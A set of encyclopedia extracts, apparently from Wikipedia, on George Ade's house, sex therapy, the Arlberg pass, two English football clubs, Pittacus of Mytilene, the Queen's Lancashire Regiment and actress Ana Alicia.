Ade bequeathed his library, manuscripts, and papers as well as most of his art objects to Purdue University. Following Ade&#x27;s death, ownership of Hazelden, his former home in Newton County, Indiana, was transferred to Purdue University, who relinquished the property to the State of Indiana when it could no longer afford its upkeep. The State of Indiana, unable to maintain the home, turned it over to Newton County, Indiana, officials. Ade&#x27;s remaining land was distributed among his relatives. In 1962 the George Ade Memorial Association raised funds to acquire, renovate, and restore the home. Hazelden (the George Ade House) was listed on the National Register of Historic Places in 1976. The Association disbanded in 2018, and, as of 2019, Newton county officials are assessing the home&#x27;s condition and plans for restoring it for use as a public historic site and events venue.

<doc id="1065584" wikidata="Q138686" url="?curid=1065584" title="Sex therapy">
<text>Sex therapy is a therapeutic strategy for the improvement of sexual function and treatment of sexual dysfunction. This includes dysfunctions such as premature ejaculation and delayed ejaculation, erectile dysfunction, lack of sexual interest or arousal, and painful sex (vaginismus and dyspareunia); as well as problems imposed by atypical sexual interests (paraphilias), gender dysphoria (and being transgender), highly overactive libido or hypersexuality, a lack of sexual confidence, and recovering from sexual abuse (such as rape or sexual assault); and also includes sexual issues related to aging, illness, or disability.

== Practice ==
Modern sex therapy often integrates psychotherapeutic techniques and medical ones, such as Viagra (sildenafil) and Cialis (tadalafil) to increase erectile response and Paxil (paroxetine) to treat premature ejaculation. Sex therapists assist those experiencing problems in overcoming them, in doing so possibly regaining an active and healthy sex life. The transformative approach to sex therapy aims to understand the psychological, biological, pharmacological, relational, and contextual aspects of sexual problems.

Sex therapy requires rigorous evaluation that includes a medical and psychological examination. The reason is that sexual dysfunction may have a somatic base or a psychogenic basis. A clear example is erectile dysfunction (sometimes still called &quot;impotence&quot;), whose causes may include circulatory problems and performance anxiety. Sex therapy is frequently short term, with duration depending on the causes for therapy.

Sex therapy can be provided by licensed psychologists or physicians, who have undergone training and become certified. These trainings and certifications usually begin with a master&#x27;s degree, and internship, and a license. This can take up to two years, and longer if a doctoral degree is desired.

Certified sex therapists do not have sexual contact with their clients. Sex therapy is distinct from sex surrogates. Whereas sex therapists discuss and instruct clients in sex-based exercises to be performed at home between sessions, sexual surrogates participate in the exercises with their clients as part of helping them to practice and develop improved skills. Therapists and surrogates sometimes collaborate on cases.

=== Symptoms ===
Sex therapy sessions are focused on the individual&#x27;s symptoms rather than on underlying psychodynamic conflicts. The sexual dysfunctions which may be addressed by sex therapy include non-consummation, premature ejaculation, erectile dysfunction, low libido, unwanted sexual fetishes, sexual addiction, painful sex, or a lack of sexual confidence, assisting people who are recovering from sexual assault, problems commonly caused by stress, tiredness, and other environmental and relationship factors. Sex therapy can either be on an individual basis or with the sex partner. Sex therapy can be conducted with any adult client, including older adults, any gender expression, and LGBTQ-identified people.

A therapist&#x27;s misunderstanding of these conflicts can lead to resistance or serve as a barrier to improving sexual dysfunctions that are directly or indirectly related to sex. The interest in sex therapy among couples has increased along with the number of sexuality educators, counselors, and therapists. Today, sexual problems are no longer regarded as symptoms of hidden deviant, pathological, or psychological defects in maturity or development. Sex therapy has also influenced the emergence of sexual medicine and exploring integrative approaches to sex therapy, in addition to reducing or eliminating sexual problems and increasing sexual satisfaction for individuals of all stages of life. Health therapists, educators, and counselors are conducting research and administering surveys to fully understand normative sexual function – what most people do and experience as they grow older and live longer.

== Aging and sexuality ==
Both physical and emotional transformation throughout various stages of life can affect the body and sexuality. The subsequent decline in hormone levels and changes in neurological and circulatory functioning may lead to sexual problems such as erectile dysfunction or vaginal pain. These physical changes often affect the intensity of youthful sex and may give way to more subdued responses during middle and later life. Issues with low libido and sexual dysfunction are usually considered to be a byproduct of old age. The emotional byproducts of maturity, however — increased confidence, better communication skills, and lessened inhibitions — can help create a richer, more nuanced, and ultimately satisfying sexual experience. During AARP&#x27;s last surveys in 1999, 2004, and 2009 statistics show well-being among older adults has increased; however, overall sexual satisfaction has decreased. Nevertheless, older adults believed that an active sexual life offers great pleasure and contributes materially to overall emotional and physical health.

=== Older adults ===
Over the years, little attention has been paid to older adults and sexuality. As the population of older adults and life expectancy continue to grow, there is information about sex therapy but it is often not easily accepted. Cultural and sexual roles are always changing throughout the life-course. As people age, they are often viewed as asexual or as incapable of possessing sexual desires. The presence of sexual dysfunction during old age can be impacted by health problems. There are many endocrine, vascular and neurological disorders that may interfere in sexual function, along with some medications and surgeries. Older men experience changes that occur in sexual physiology and affect both erectile function and ejaculation. While older women experience physiological effects of aging after menopause, resulting in the decreased production of estrogen. This leads to increased vaginal dryness, general atrophy of vaginal tissue, and genital changes (reduced size of clitoral, vulvar, and labial tissue). Cognitive changes and decline is another factor that influences sexual activity. Dementia, Alzheimer&#x27;s and mental health disorders may have an effect on sexual behavior, producing disinhibition or relationship difficulties with subsequent effects on couple&#x27;s sexual relationships.

Sex therapy with older adults looks at factors which influence sexuality in older adults, including sexual desire, sexual activity, the value of sexuality, and health. It can include sensate focus, communication, and fantasy exercises as well as psychodynamic therapy.

Sex therapy for older adults is similar to sex therapy with other populations. It includes the use of water-based personal lubricants (for decreased vaginal lubrication), hormone therapy, and medications. Sex therapists working with older adults should know about sexuality and aging. They should also be aware of how stereotypes affect their clients. This is especially true for LGBT-identified clients.

Older adults may also need more education about their sexuality and sexual functioning. Curriculum for this includes communication, masturbation, body image, and spirituality. It also teaches about talking to a doctor about sexual activity. It is optimal that sex education for older adults includes information about sexually transmitted infections (STDs/STIs), such as HIV/AIDS.

== History ==
Sex therapy has existed in different cultures throughout time, including ancient India, China, Greece, and Rome. It has taken the form of manuals, spells, anaphrodisiacs or aphrodisiacs, and tantric yoga, among others. Much of sex therapy and sexual dysfunction in Western cultures was limited to scientific discussion, especially throughout the 19th century and into the early 20th century.

Sexologists such as Henry Havelock Ellis and Alfred Kinsey began conducting research in the area of human sexuality during the first half of the 20th century. This work was groundbreaking and controversial in the scientific arena.

In the 1950s, sex therapy was concerned with &quot;controlling sexual expression&quot; and repressing what was then-considered deviant behaviors, such as homosexuality or having sex too often. Masters and Johnson are credited with revolutionizing sex therapy in the mid-century and included couple therapy and behavioral interventions that focused on being present in the moment such as sensate focus exercises. Dr. Helen Singer Kaplan modified some of Masters and Johnson&#x27;s ideas to better suit her outpatient practice, including introducing medication. Both integrated cognitive behavioral therapy into their practice and Kaplan used psychodynamic therapy as well. The combination of hypnotic procedures with humanistic psychodrama (Hans-Werner Gessmann 1976) is an option. The work of Jack Annon in 1976 also saw the creation of the PLISSIT model that sought to create a structured system of levels for the therapist to follow.

The mid-1980s saw the medicalization of sex therapy, with a primary focus on male sexual dysfunction. The 1990s brought penile injections and medications such as Viagra as well as the marketing of antidepressants for their delayed ejaculation side-effects. Hormone therapy was introduced to assist both male and female sexual dysfunction. Dilators were used to treat women with vaginismus and surgical procedures to increase the size of the vaginal opening and treat vulvar pain were also introduced.

<text>The Arlberg (, also: &quot;Arlberg Pass&quot;) is a mountain pass between states of Tyrol and Vorarlberg in Austria. Ski resorts at the Arlberg include Lech, Zürs, Stuben, St. Christoph, St. Anton, Oberlech, Stubenbach, Zug, and Warth. It is the mountain pass from which the Austrian State of Vorarlberg, meaning &#x27;before the Arl mountain&#x27;, gets its name.

== Geography ==
The Arlberg connects the Klostertal Valley in the west with the Stanzer Valley in the east. Together with the Flexenpass, it borders three mountain groups: the Verwall in the south, the Lechquellen mountains in the northwest, and the Lechtal Alps in the northeast. The Valluga, which stands as the highest mountain of the Arlberg, and the Trittkopf, southwest of the Lechtal Alps, dominate the pass. Four communities meet: on the Vorarlberg side, Lech and Klösterle–Stuben; on the Tyrol side, Kaisers and St. Anton. The watershed between the Rhine and the Danube rivers runs south from the Albonagrat to the Passhöhe, over the Valluga and Trittkopf, to the Flexenpass, and it traces from the Flexenspitz the southern edge of the Lechquellen mountains westward to the Klostertal.

== Pass roads and the Arlberg tunnel ==
The old pass route was known since the 14th century in the form of a narrow mule track when people began to trade salt in the region. However, because the Arlberg was very poorly developed, for centuries people avoided the route and took detours over the Fern Pass or Immenstadt for trading. The development of the textile industry and of the postal service, however, led to the roads being surfaced in 1824.

With the rise of motor traffic in the 20th century, however, this became inadequate. It was decided that a Arlberg Road Tunnel would be built between Langen and St. Anton. On July 5, 1974, the work began and the passage was opened to traffic on December 1, 1978. The tunnel has a toll; however, the old road over the pass is toll-free. A peculiarity of the tunnel is that it actually consists of two tunnels. On the Tyrolian side it is built over the Rosanna Gorge before the actual massif rises up in the direction of Vorarlberg over the tunnel.

== Arlberg Railway ==

The Arlberg railway connects Innsbruck with Bludenz. Between St. Anton and Langen it runs through the long Arlbergtunnel.

==Tourism==
Tourism is the main source of income for Arlberg villages and their inhabitants and plays a vital role in the region.

Today, &quot;Arlberg&quot; is a brand for the winter sports areas around the Arlberg Pass, in particular the ski areas of Lech, Zürs, Stuben, Klösterle and St. Christoph, St. Anton am Arlberg.

The area is known for its long winter sports tradition. As early as 1901, the Arlberg ski club was founded and two years later a first club competition was held. In 1904 the first general Arlberg race took place, 1928 the first of the famous Arlberg Kandahar races. In 1921, under the leadership of Hannes Schneider, the ski school Arlberg was the first ski school in the region.

In 1937, the first lifts were built in St. Anton and in Zürs. It was the first ski-lift built by Konrad Doppelmayr and Sepp Bildstein. With the 2001 FIS Ski World Cup in St. Anton, alpine ski racing came back to the Arlberg and thus to its roots. In 2021, St. Anton am Arlberg will be holding a combination ski race with a slalom and a super-G on January 9 and 10 as part of the FIS Alpine Skiing World Cup 2020–21.

Today, the contiguous ski resorts on three mountains around Lech and Zürs, the Arena on Gampen, Kapall, Galzig and Valluga above St. Anton and St. Christoph, form a ski resort with 87 lifts, 305 km of groomed slopes and 200 km of deep snow slopes. Thanks to the many winter sports enthusiasts, tourism at the Arlberg is of great importance. Between 1 November 2001 and 31 October 2002, more than one million overnight stays were counted for the first time.
===Ski Arlberg===
Ski Arlberg is the biggest connected ski resort in Austria, consisting of the villages of Lech, Oberlech, Zürs and Zug, which were linked to Warth and Schröcken in 2013–14. The ski area comprises 15 aerial tramways, 45 chairlifts and 28 drag lifts.The White Ring, the world&#x27;s longest ski circuit (22 km), is located within the Ski Arlberg area. Since 2005–06, annual White Ring races have been held.

Football in Bishop Auckland can be traced back to 1882 when theological students from Cambridge and Oxford Universities studying at Auckland Castle, home to the Bishop of Durham in Bishop Auckland, formed a team known as Bishop Auckland Church Institute. The founding students chose Cambridge and Oxford Blue as the club&#x27;s colours to reflect the origins of the new team.
A later dispute caused a breakaway team called Auckland Town in 1886 and it was from this upheaval that Bishop Auckland Football Club was eventually born. Eight days after its formation, the club initially chose royal blue with white facings for the playing kit and subsequently changed to the more familiar light (Cambridge) and dark (Oxford) blue colours of the original Church Institute later, representing the colours of Oxbridge, and the origins of football in Bishop Auckland.

In 1889 Auckland Town were one of the 10 founding members of the World&#x27;s second-oldest football league – the Northern League. The inaugural season was largely uneventful with the team finishing 8th with the league&#x27;s first winners being St. Augustine&#x27;s (Darlington).
Between the years of 1891 and 1893 the team never participated in league football but it was during this time that the club won its first silverware – the Durham County Challenge Cup – in 1892.

The team name was changed in 1893 to Bishop Auckland and it was under this name that the football club rejoined the Northern League. The following two seasons under the new name were again uneventful as the club finished third bottom on both occasions.

During the 1895–96 season Bishop Auckland won their first silverware on a national scale – the Amateur Cup – defeating Royal Artillery Portsmouth 8–0 in the final. Over the following few seasons the team steadily improved their league position and in 1898–99 won the Northern League championship for the first time. It was also during 1899 that Bishop Auckland picked up their second Durham County Challenge Cup.

It was clear that Bishop Auckland was an appealing prospect for the region&#x27;s talented footballers as the Northern League was won a further five times (and shared with Sunderland &#x27;A&#x27; in 1905–06) and the Amateur Cup final was reached a further six times (beating Lowestoft Town 5–1 in 1900 and Northern Nomads 1–0 in 1914) before football was suspended due to World War I.

After the war, Bishop Auckland picked up where they left off finishing as league runners-up to South Bank in 1919–20, winning the following season and runners-up again the following two seasons.
During this time the Amateur Cup was added twice more with wins over Swindon Victoria (4–2, 1921) and South Bank (5–2 (aet), 1922).

The next honour was won nearly a decade later when the league championship was added in 1931 along the Durham County Challenge Cup. In 1935 the Amateur Cup final was reached again with Wimbledon being defeated 2–1 in a replay after the original tie finished goalless after extra time.

The Bishops had perhaps their best-ever season in 1938–39 when they completed a treble. Future Liverpool player and manager Bob Paisley played at right-back in the team which won the Northern League title, the Durham County Challenge Cup and the FA Amateur Cup. The Amateur Cup final was played in Durham at Roker Park where the Bishops defeated Wellington 3–0 after extra time.

Following World War II Bishop Auckland reached the Amateur Cup final for the eleventh time but went down 3–2 against Barnet.
The following season, 1946–47, another Northern League title was added with Crook Colliery Welfare runners-up. The team were runners-up the following two seasons (1948–49), to Ferryhill Athletic and Evenwood Town respectively.

=== Glory days ===
The 1950s were to be Bishop Auckland&#x27;s best with the Northern League title won in the first three seasons with Billingham Synthonia being the runners-up on each occasion. Bishop and Willington both reached the final of the Amateur Cup in 1950, Willington producing a shock to triumph 4–0 over their more glamorous neighbours and take the Cup back to County Durham. The following season the Amateur Cup final was reached again. The opponents were Pegasus and again Bishops had to settle for a runners-up medal as Pegasus were the victors after a 2–1 win. In &#x27;53 Bishop were runners-up to Crook Town in the league but added the title another three times over the next three seasons (&#x27;54, &#x27;55 and &#x27;56), with Crook Town being runners-up on each occasion. In &#x27;54 the Amateur Cup final was again reached, this time Crook Town were the opponents and it was the Black and Ambers that triumphed after a narrow 1–0 win.

The next three seasons were unprecedented in Amateur Cup history. Not only did Bishops reach the final on each occasion, but also finished the victors on each occasion. The opponents being; &#x27;55 Hendon (2–0), &#x27;56 Corinthian-Casuals (1–1 (aet), 4–1) and &#x27;57 Wycombe Wanderers (3–1). The latter being Bishops last appearance in the Amateur Cup final.
That wasn&#x27;t the last of the silverware in the 1950s, however. The Durham County Challenge Cup was again added in 1956.

Bishop Auckland FC&#x27;s best footballing performance was arguably played in the 1954–55 season in which they won the Northern League Division One, the Northern League Cup, the FA Amateur Cup and reached the 4th round in the FA Cup losing only to York City who then went on to lose to Newcastle United in the semi-final.
Bishop Auckland were a truly remarkable football team in this era, they have played at Wembley on numerous occasions and had a huge number of fans supporting them. The 1954–55 FA Amateur Cup final saw the crowd reach 100,000 – the last occasion an amateur match attracted such a crowd.
The Bishops team of this era contained many quality players that eventually found their way into the professional game. Seamus O&#x27;Connell, a forward, went on to play for Chelsea in the 1954–55 season, other players – Derek Lewin, Bob Hardisty and Warren Bradley – went on to play for Manchester United following the Munich air disaster and earned international caps at both amateur and professional level, most notably Warren Bradley who is the only English player to have done this in the same season.

In 1960, Bishops were league runners-up to near-neighbours West Auckland Town. The Northern League title was again won in 1967, along with the League Cup and the Durham County Challenge Cup. This was the first time any team had won the &#x27;local treble&#x27; and this achievement was added to by an 11 match campaign in the F A Cup that ended in a 7–0 defeat at Halifax Town in a 2nd round replay.

The 1970s were a lean decade for the club in terms of silverware, the league cup being the only competition the club won in the 1975–76 season.

Bishops had to wait until the 1980s until their next piece of silverware – a league and county cup double being added in &#x27;85 and &#x27;86.
After finishing 6th in 1988 it was decided by the club&#x27;s hierarchy that a higher level of league football was necessary for the club to grow. Bishops left the Northern League for the second time and joined the Northern Premier League. Again, the Durham County Challenge Cup was won this season.

=== Promotion to Premier Division===
In their debut season in the Northern Premier League the team made their mark in the First Division and finished as runners-up – winning promotion to the Premier Division in the process.
The team more than held their own over the following seasons with the club&#x27;s highest position in the pyramid being achieved in 1997 – 2nd in the Premier League of the Northern Premier League. The county cup was again won this season.

In 2002, the club suffered its first relegation in its history despite not finishing in a relegation place. Bishops were relegated by the Northern Premier League on a ground technicality.

Bishops battled back and again found themselves in the Premier Division following the 2004 restructuring of the non-league pyramid. However, with the ground situation continuing and a percentage of the playing budget being taken up by rent towards Spennymoor United and Shildon, it proved difficult in attracting the quality of player necessary to maintain a place in the Northern Premier League. The following season Bishops suffered their second successive relegation and returned to the Northern League for the 2006–07 season.

=== Return to the Northern League ===
Bishops returned to the Northern League still in a groundsharing agreement with Shildon. This would prove to have an important bearing on the playing budget available to the manager as the club fought to balance the books following relegation. Whilst the manager was confident of a good season, it was clear from early in the season that Bishop were not to be challengers at the top of the table. A solid, if unspectacular, league campaign ended with the Blues finishing 18 points above the drop zone in 16th place.

The following season proved to be even more difficult. With the club having to further reduce the playing budget and as a result performances on the field took a turn for the worse. The season ended with the club in 20th place. Normally, this would have resulted in relegation but with Durham City electing to take promotion to the Northern Premier League, Bishops were spared so the first division of the Northern League could continue with 22 clubs.

Season 2008–09 proved to be better both on and off the pitch and the club entered a groundsharing agreement with West Auckland Town. Whilst the league campaign got off to a disastrous start, the club&#x27;s plans for a new ground were given the go-ahead in November, but the club were rooted to the bottom of the league. The board decided to take action and a new manager, Colin Myers, was appointed in February. Prior to Colin&#x27;s first game the Blues were ten points adrift of safety. Over the next twenty games the team gained 26 points to eventually finish the season in 18th place – seven points clear of the relegation zone. A truly remarkable turnaround with only a few additions to the playing squad.

In 2013 the Bishops won the Durham Challenge Cup defeating neighbours and F A Vase holders Spennymoor Town.

The 2023–24 season saw Bishop Auckland promoted from Northern League Division One as champions.

===First Team Backroom Staff===
==Bishop Auckland Ladies==
Bishop Auckland Ladies are the Official Ladies Team for Bishop Auckland FC. Formed in May 2013, Bishop Auckland Ladies Development Team was set up in May 2015, with the aim to provide female players, a place to develop before taking the step up to first-team football, and in recent times has been used as a tool to scout players for the Senior team.
Bishop Auckland Ladies currently play in the North-East Region Women&#x27;s Football League Division One North, gaining promotion in the 2020 season, they were 6th in the league when it was suspended in the 2020/21 season. In 21/22 Bishop Ladies finished 7th place in the North-East Region Women&#x27;s Football League Division One North

==Ground==
Between the years of 1892 and 2002 Bishop Auckland played their home matches at Kingsway, a ground shared with the town&#x27;s cricket club. The club moved out of Kingsway with plans to move into a purpose-built stadium at Tindale Crescent out of the town centre, but still in the conurbation of Bishop Auckland. Plans were submitted to Wear Valley District Council in early September 2008, planning permission was granted in mid-November 2008 and the club moved into the 2,004 capacity ground in October 2010. While waiting for the ground to be constructed, the club groundshared at West Auckland Town&#x27;s Darlington Road for 2008–09, 2009–10 and part of the 2010–11 seasons. They also had stints at Dean Street, home of Shildon, between 2002–04 and 2006–08 and at Brewery Field, Spennymoor, home of Spennymoor Town, between the spells at Shildon.

The current attendance record at Heritage Park is 2,004 for the game between Bishop Auckland and Darlington F.C. in August 2012.

<text>Lincoln United Football Club is a football club based in Lincoln, Lincolnshire, England. They are currently members of the and play at Ashby Avenue. Nicknamed the Whites after their home kit colours, they have played at Ashby Avenue since their foundation in 1938.

==History==
The club was established in 1938 as Lincoln Amateurs, but World War II prevented them from joining a league until 1945, when they became members of the Lincolnshire League. The following season saw them transfer to the Lincoln League, and in 1954 the club were renamed Lincoln United after taking on a paid player, Ray Bean. In 1960 they rejoined the Lincolnshire League and went on to win the league title in 1963–64. The club moved up to Division Two of the Yorkshire League in 1967 and won the division at the first attempt, earning promotion to Division One.

Lincoln United were Division One champions in 1970–71 and again in 1973–74. However, after finishing bottom of the division in 1978–79, the club were relegated to Division Two. A third-place finish in Division Two in 1980–81 saw them promoted back to Division One. In 1981 the Yorkshire League merged with the Midland League to form the Northern Counties East League, with Lincoln placed in Division One South. Although they won the division in the league&#x27;s inaugural season, the club were not promoted. League reorganisation in 1985 led to Lincoln being placed in Division Two. Although they won the division at the first attempt, the club left the league to join the newly formed Supreme Division of the Central Midlands League.

The 1991–92 season saw Lincoln United reach the first round of the FA Cup for the first time, losing 7–0 at Huddersfield Town; this was the first (and still the only) time a club from the Central Midlands League reached the FA Cup first round. They went on to win the Supreme Division at the end of the season and moved back up to Division One of the Northern Counties East League. The following season saw the club win the Division One title, securing promotion to the Premier Division. They went on to win the Premier Division in 1994–95 and were promoted to Division One of the Northern Premier League.

The next two seasons saw Lincoln finish third in Division One, narrowly missing out on the two promotion places. In 1997–98 they reached the FA Cup first round again, losing 2–0 at Walsall. A fourth-place finish in 2003–04 was enough for promotion to the Premier Division, with the creation of the Conference North and South seeing numerous clubs promoted to fill the new divisions. However, the club were relegated in 2007–08 after finishing bottom of the Premier Division, dropping into Division One South. In 2015–16 they finished fifth in the division, qualifying for the promotion play-offs for the first time. In the play-offs the club were beaten 3–2 in the semi-finals by Shaw Lane. The following season the club won the Lincolnshire Senior Cup for the first time, beating Stamford 3–2 in the final.

In 2022–23 Lincoln finished third-from-bottom of Division One East of the Northern Premier League, resulting in them facing an inter-step play-off with a club from the division below. After being beaten 2–1 by Avro they were relegated to the Premier Division North of the United Counties League. They were runners-up in the division the following season, subsequently losing 3–1 to Skegness Town in the play-off semi-finals.
===Women&#x27;s team===
Originally founded in 2017 as Hykeham Town Ladies, the club was renamed Lincoln United Women in 2020 when the club amalgamated with Lincoln United. The club were then members of the East Midlands Regional Women&#x27;s League Premier Division, having been promoted from Division One North following the curtailed 2019–20 season. In 2022–23 the team won the Lincolnshire FA County Women&#x27;s Cup for the first time, defeating Lincoln City Women 2–0 in the final. In 2023–24 the team completed a treble, winning all 18 league games to secure the league title and earn promotion to Division One Midlands of the FA Women&#x27;s National League, as well as winning the League Cup and the Lincolnshire FA County Women&#x27;s Cup.

<doc id="1065607" wikidata="Q311835" url="?curid=1065607" title="Pittacus of Mytilene">
<text>Pittacus (; ; 640 – 568 BC) was an ancient Mytilenean military general and one of the Seven Sages of Greece.

==Biography==
Pittacus was a native of Mytilene and son of Hyrradius. He became a Mytilenaean general who, with his army, was victorious in the battle against the Athenians and their commander Phrynon. In consequence of this victory, the Mytilenaeans held Pittacus in the greatest honour and presented the supreme power into his hands. After ten years of reign, he resigned his position and the city and constitution were brought into good order.

When the Athenians were about to attack Sigeion, Pittacus challenged their general to a single combat, with the understanding that the result should decide the war, and much bloodshed be thereby avoided. The challenge was accepted, and he killed his enemy with a broad sword. He was then chosen ruler of his city and governed for ten years, during which time he made laws in poetry, one of which was to this effect: &quot;A crime committed by a person when drunk should receive double the punishment that it would merit if the offender were sober.&quot; His great motto was this: &quot;Whatever you do, do it well.&quot;

Polyaenus in his Stratagems wrote that Pittacus had secretly concealed a net under his shield. He caught Phrynon with the net, dragged him down and killed him. According to Polyaenus, this stratagem of Pittacus gave rise to the use of nets in duels between gladiators.

Some authors mention that he had a son called Tyrrhaeus. The legend says that his son was killed and when the murderer was brought before Pittacus, he dismissed the man and said, &quot;Pardon is better than repentance.&quot; Of this matter, Heraclitus says that he had the murderer into his power and then released him, saying, &quot;Pardon is better than punishment.&quot;

Pittacus said that &quot;[It] is a hard thing to be a good man.&quot; In Plato&#x27;s &quot;Protagoras&quot;, Socrates discusses this saying at length with Protagoras, and Prodicus of Ceos calls &quot;barbarian&quot; the Aeolic dialect that Pittacus spoke: &quot;He didn&#x27;t know to distinguish the words correctly, being from Lesbos, and having been raised with a barbarian dialect.&quot;

He flourished around the forty-second Olympiad. Having lived for more than seventy years, he died in the third year of the fifty-second Olympiad (568 BC).

==Writings==
The Suda claims that Pittacus wrote a prose work about laws and also an elegiac poem of 600 lines. No trace of these works has survived.

==Legal reform==
Pittacus instituted a law stating that crimes committed in drunkenness should be punished twofold; that was directed predominantly against the aristocrats, who were more often guilty of drunk and violent behaviour. As such, it was greatly appreciated by the common people.

==Other sayings==
*&quot;Forgiveness is better than revenge.&quot;
*&quot;Whatever you do, do it well.&quot;
*&quot;Even the gods cannot strive against necessity.&quot;
*&quot;Power shows the man.&quot;
*&quot;Do not say beforehand what you are going to do; for if you fail, you will be laughed at.&quot;
*&quot;Do not reproach a man with his misfortunes, fearing lest Nemesis may overtake you.&quot;
*&quot;Forbear to speak evil not only of your friends, but also of your enemies.&quot;
*&quot;Cultivate truth, good faith, experience, cleverness, sociability, and industry.&quot;
*&quot;Know thine opportunity.&quot;

<doc id="1065613" wikidata="Q7270017" url="?curid=1065613" title="Queen's Lancashire Regiment">
<text>The Queen&#x27;s Lancashire Regiment (30th, 40th, 47th, 59th, 81st and 82nd Regiments of Foot) (QLR) was an infantry regiment of the British Army, part of the King&#x27;s Division. It was formed on 25 March 1970 at Connaught Barracks in Dover through the amalgamation of the two remaining Lancashire infantry regiments, the Lancashire Regiment (Prince of Wales&#x27;s Volunteers) and the Loyal Regiment (North Lancashire). In July 2006 the regiment was amalgamated with two other Northern infantry regiments to form the Duke of Lancaster&#x27;s Regiment.

== History ==
The 1st Battalion served on operations in Northern Ireland in 1970, 1971–72, 1972–73, 1975–76 (resident), 1977, 1980–81, 1987, 1990–92, 1997–99 (resident) and 2001.

The 1st Battalion undertook two tours with BAOR in the mechanised role. The first of which was with 12 Mechanised Brigade in Osnabrück from 1970 to 1974. The second was with 33 Armoured Brigade in Paderborn from 1984 to 1990. The 1st Battalion also had the honour of being the last British battalion to serve in Berlin prior to the final withdrawal in 1994.

Overseas service saw the 1st Battalion posted to Cyprus from 1978 to 1980 as the Western Sovereign Base Area Resident Battalion, and again in 1983, where they saw service with the United Nations. A company was dispatched to the Falkland Islands in the aftermath of the 1982 war. The 1st Battalion returned to Cyprus as the Eastern Sovereign Base Area Resident Battalion from 2004 to 2005.

In 1996 the 1st Battalion served as part of IFOR in Bosnia operating in the area known as &quot;The Anvil&quot;.

The regiment&#x27;s 1st Battalion saw service in Iraq in the months immediately following Operation Telic, from June to November 2003. Given responsibility for Iraq&#x27;s second city, Basra, it gained much praise for its efforts to restore security and civil order.

On 16 December 2004, it was announced that the Queen&#x27;s Lancashire Regiment would be merged with the King&#x27;s Regiment and the King&#x27;s Own Royal Border Regiment into the Duke of Lancaster&#x27;s Regiment (King&#x27;s Lancashire and Border). On 1 July 2006, the 1st Battalion, Queen&#x27;s Lancashire Regiment became the 1st Battalion, Duke of Lancaster&#x27;s Regiment.

== Territorials ==

As well as the regular 1st Battalion, the regiment also had a Territorial Army 4th Battalion, which was formed on 1 April 1975, with headquarters at Kimberley Barracks, Preston and companies at various times in Ashton-under-Lyne, Blackburn, Blackpool, Bolton, Burnley and Bury. As part of the Strategic Defence Review, the 4th Battalion merged with the 4th Battalion the King&#x27;s Own Royal Border Regiment to create the Lancastrian and Cumbrian Volunteers in July 1999.

==Abuses In Iraq==

Some months after returning from Iraq the battalion was at the centre of the first serious accusations of abuse against Iraqi prisoners levelled at British soldiers. These accusations were illustrated on the front pages of the &quot;Daily Mirror&quot; by photographs which the regiment immediately denounced as staged fakes. The regiment then ran a successful campaign, believed to be unique for an active unit of the British Armed Forces, to prove that the pictures were false. After two weeks, the &quot;Mirror&quot; was forced to admit that it had found &quot;sufficient evidence to suggest that these pictures are fakes and that the Daily Mirror has been the subject of a calculated and malicious hoax.&quot; Editor Piers Morgan was forced to resign when he refused to apologise.

There has however been at least one case of true abuse; Corporal Donald Payne became Britain&#x27;s first convicted war criminal after pleading guilty to abusing Iraqi detainees, which resulted in the death of one detainee Baha Mousa. Six other soldiers were cleared of any wrongdoing. The presiding judge, Mr Justice McKinnon, stated that &quot;none of those soldiers has been charged with any offence, simply because there is no evidence against them as a result of a more or less obvious closing of ranks.&quot; The report from a 2011 inquiry into the killing stated that 19 soldiers had assaulted Mousa and nine other Iraqi detainees and that many other soldiers, including officers, must have known what was happening.

On 19 July 2005, Attorney General Lord Goldsmith announced that Payne was being charged with manslaughter, perverting the course of justice and inhumane treatment of persons under the International Criminal Court Act 2001. On the same day, another ten soldiers were also charged with similar crimes, six relating to the death of Mousa and four relating to the death of another Iraqi, Ahmed Jabber Kareem Ali, on 8 May 2003.

The court martial was held in Bulford Camp, Wiltshire, after an investigation by the Royal Military Police. It convened in the autumn of 2006, and concluded six months later in April 2007, being the most expensive Court Martial in modern British military history 

During the court martial, Corporal Payne admitted he &quot;enjoyed&quot; hearing Iraqis call out during torture, describing their cries of pain as &quot;the choir&quot;. He was cleared of manslaughter and perverting the course of justice. Six other soldiers were cleared of any charges.

After earlier pleading guilty to the offence of inhuman treatment of persons protected under the Geneva Conventions, Corporal Donald Payne was sentenced to 12 months imprisonment, reduced to the ranks, and dismissed from Her Majesty&#x27;s Armed Forces, on 30 April 2007.

<text>Ana Alicia Ortiz Torres (born December 12, 1956) is a Mexican-American retired actress who performed in theatre and on television. After getting her television start by spending a year on the daytime soap-opera &quot;Ryan&#x27;s Hope&quot;, she gained international recognition for her role as scheming vineyard heiress Melissa Agretti on the long-running primetime soap opera &quot;Falcon Crest&quot; which she portrayed for seven seasons from 1982 until 1988. She has also performed in few single episode guest-starring roles on various televisions shows or in television movies most years from the late-1970s to the mid-1990s.

==Early life==
Ana Alicia Ortiz Torres was born in Mexico City to Alicia Torres and Carlos Celestino Ortiz, who ran businesses in Acapulco, Mexico. She was the third of four children. Her family moved to El Paso, Texas, when she was six years old after her father&#x27;s death, and she lived with her mother, three siblings, grandmother, and uncle in a house that her father had purchased for her grandmother. Upon graduating from high school in 1972, Ortiz earned a scholarship to Wellesley College. Upon arrival at Wellesley College, Ortiz auditioned and won the lead role for Jules Feiffer&#x27;s &quot;Crawling Arnold&quot;.

On summer break after her freshman year, Ortiz auditioned for The Adobe Horseshoe Dinner Theatre outside El Paso, Texas. The theatre offered her a position as a recurring actress in all feature productions. The opportunity would allow her to work with name actors from Hollywood and New York and receive a large weekly salary. She accepted the offer and also acquired her actor&#x27;s equity card through her term. She left Wellesley College, instead pursuing her bachelor&#x27;s degree in drama at the University of Texas at El Paso to be closer to her mother and three brothers.

Her first professional role under an AEA contract was as one of the Pigeon Sisters in a production of &quot;The Odd Couple&quot; starring Bob Denver at The Adobe Horseshoe Dinner Theater in El Paso.

Ana Alicia spent the next three years performing in main stage productions at UTEP as well as having significant roles in the Adobe Horseshoe repertoire.

==Career==
After earning her degree in 1977, Ortiz moved to Los Angeles and started auditioning for roles in various productions. She won the part of Alicia Nieves on &quot;Ryan&#x27;s Hope&quot;, a daytime soap opera, moving to New York City for taping. After fifteen months on the show, Ortiz moved back to Los Angeles part-time and kept auditioning while attending law school at Southwestern Law School at night back in Texas. Eventually, her acting opportunities suffered and she decided to pursue acting full-time.

